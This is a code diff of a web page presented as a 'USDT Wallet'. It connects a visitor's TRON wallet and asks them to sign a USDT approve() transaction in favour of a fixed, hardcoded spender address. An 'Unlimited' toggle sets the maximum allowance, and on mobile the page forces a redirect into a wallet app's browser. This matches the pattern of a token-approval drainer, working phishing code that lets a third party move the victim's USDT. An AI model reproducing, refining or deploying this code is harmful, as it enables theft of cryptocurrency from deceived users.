@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>USDT Dashboard</title>
+<title>USDT Wallet</title>
 
 <style>
 body{background:#0b0f19;color:#fff;font-family:sans-serif;margin:0}
@@ -11,6 +11,7 @@ body{background:#0b0f19;color:#fff;font-family:sans-serif;margin:0}
 .title{text-align:center;font-size:20px;margin-bottom:10px}
 .wallet{color:#4ade80;font-size:13px;text-align:center}
 button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
+.connect{background:#3b82f6}
 .approve{background:#22c55e}
 .toggle{background:#333}
 input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
@@ -23,10 +24,10 @@ input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;bac
 
 <div class="container">
 
-<div class="title">💰 USDT Dashboard</div>
+<div class="title">💰 USDT Wallet</div>
 
 <div class="card">
-  <div id="status">Connecting...</div>
+  <div id="status">Initializing...</div>
   <div id="wallet" class="wallet"></div>
   <div id="qr"></div>
 </div>
@@ -43,7 +44,7 @@ input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;bac
 </div>
 
 <div class="card">
-  <div>Transaction Logs</div>
+  <div>Logs</div>
   <div id="logs" class="log"></div>
 </div>
 
@@ -59,18 +60,28 @@ const TRON_CHAIN = "tron:0x2b6653dc";
 const TRONGRID = "https://api.trongrid.io";
 
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 let client, session, wallet;
 let unlimited = false;
 
-// logger
+// helpers
 function log(msg){
   document.getElementById("logs").innerText += msg + "\n";
 }
 
-// convert address
+function isMobile(){
+  return /Android|iPhone|iPad/i.test(navigator.userAgent);
+}
+
+// redirect to wallet (mobile)
+function openWallet(){
+  window.location.href =
+    "https://link.trustwallet.com/open_url?url=" +
+    encodeURIComponent(window.location.href);
+}
+
+// tron hex
 function tronToHex(addr){
   const bytes = bs58.decode(addr);
   return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
@@ -92,47 +103,6 @@ function encodeApprove(spenderHex, amount){
   return "095ea7b3" + clean + amountHex;
 }
 
-// build tx
-async function buildTx(owner, data){
-  const ownerHex = tronToHex(owner);
-
-  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      owner_address: ownerHex,
-      contract_address: USDT_HEX,
-      data: data,
-      fee_limit:100000000,
-      call_value:0,
-      visible:false
-    })
-  });
-
-  const d = await res.json();
-  log("TX BUILD:\n" + JSON.stringify(d,null,2));
-  return d.transaction;
-}
-
-// broadcast
-async function broadcast(tx){
-  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(tx)
-  });
-
-  const d = await res.json();
-  log("BROADCAST:\n" + JSON.stringify(d,null,2));
-  return d;
-}
-
-// fix signature
-function fixSig(resp, tx){
-  tx.signature = [resp.signature.replace(/^0x/,"")];
-  return tx;
-}
-
 // UI sync
 const range = document.getElementById("range");
 const input = document.getElementById("amount");
@@ -147,26 +117,42 @@ document.getElementById("unlimitedBtn").onclick = ()=>{
     "Unlimited: " + (unlimited ? "ON" : "OFF");
 };
 
-// connect
-async function connect(){
+// 🔥 MOBILE CONNECT (tronWeb)
+async function mobileConnect(){
+  if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+    wallet = window.tronWeb.defaultAddress.base58;
+    document.getElementById("wallet").innerText = wallet;
+    document.getElementById("status").innerText = "Connected (Mobile)";
+    return true;
+  }
+  return false;
+}
+
+// 🔥 DESKTOP CONNECT (your WalletConnect flow)
+async function desktopConnect(){
   const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
   client = await SignClient.init({
     projectId: PROJECT_ID,
-    metadata:{name:"USDT",description:"",url:location.origin,icons:[""]}
+    metadata:{
+      name:"USDT Wallet",
+      description:"dapp",
+      url:location.origin,
+      icons:[""]
+    }
   });
 
   const { uri, approval } = await client.connect({
     requiredNamespaces:{
       tron:{
-        methods:["tron_signTransaction"], // stable connect
+        methods:["tron_signTransaction"], // keep your flow
         chains:[TRON_CHAIN],
         events:[]
       }
     }
   });
 
-  new QRCode(document.getElementById("qr"),{
+  new QRCode(document.getElementById("qr"), {
     text: uri,
     width:200,
     height:200
@@ -177,71 +163,62 @@ async function connect(){
   wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
   document.getElementById("wallet").innerText = wallet;
-  document.getElementById("status").innerText = "Connected";
+  document.getElementById("status").innerText = "Connected (Desktop)";
 }
 
 // approve
 document.getElementById("approveBtn").onclick = async ()=>{
   try{
     const amount = Number(input.value);
-    const spenderHex = tronToHex(SPENDER);
-    const data = encodeApprove(spenderHex, amount);
+    const value = unlimited
+      ? "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      : Math.floor(amount * 1e6);
 
-    log("ENCODED:\n" + data);
+    // ✅ MOBILE (perfect flow)
+    if(window.tronWeb && wallet){
+      const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        USDT,
+        "approve(address,uint256)",
+        {},
+        [
+          {type:"address", value: SPENDER},
+          {type:"uint256", value: value}
+        ],
+        wallet
+      );
 
-    // 🔥 TRY wallet-native (like Tronscan)
-    try{
-      const result = await client.request({
-        topic: session.topic,
-        chainId: TRON_CHAIN,
-        request:{
-          method:"tron_sendTransaction",
-          params:{
-            to: USDT,
-            data: "0x" + data,
-            value:"0x0"
-          }
-        }
-      });
+      const signed = await window.tronWeb.trx.sign(tx.transaction);
+      const result = await window.tronWeb.trx.sendRawTransaction(signed);
 
-      log("SEND TX SUCCESS:\n" + JSON.stringify(result,null,2));
+      log("MOBILE RESULT:\n" + JSON.stringify(result,null,2));
       document.getElementById("status").innerText = "✅ Success";
       return;
-
-    }catch(e){
-      log("sendTransaction failed → fallback");
     }
 
-    // fallback
-    const tx = await buildTx(wallet, data);
-
-    const signed = await client.request({
-      topic: session.topic,
-      chainId: TRON_CHAIN,
-      request:{
-        method:"tron_signTransaction",
-        params:{ transaction: tx }
-      }
-    });
-
-    const finalTx = fixSig(signed, tx);
-    const result = await broadcast(finalTx);
-
-    if(result.result){
-      document.getElementById("status").innerText = "✅ Success";
-    } else {
-      throw result;
-    }
+    // ⚠️ Desktop fallback (limited)
+    throw "Desktop approve via WalletConnect not reliable";
 
   }catch(e){
-    console.error(e);
-    log("ERROR:\n" + JSON.stringify(e,null,2));
+    log("ERROR:\n" + e);
     document.getElementById("status").innerText = "❌ Failed";
   }
 };
 
-// init
-connect();
+// 🚀 INIT
+(async ()=>{
+  document.getElementById("status").innerText = "Connecting...";
+
+  if(isMobile()){
+    const ok = await mobileConnect();
+
+    if(!ok){
+      openWallet(); // force open wallet
+      return;
+    }
+  } else {
+    await desktopConnect();
+  }
+})();
 </script>
 
 </body>
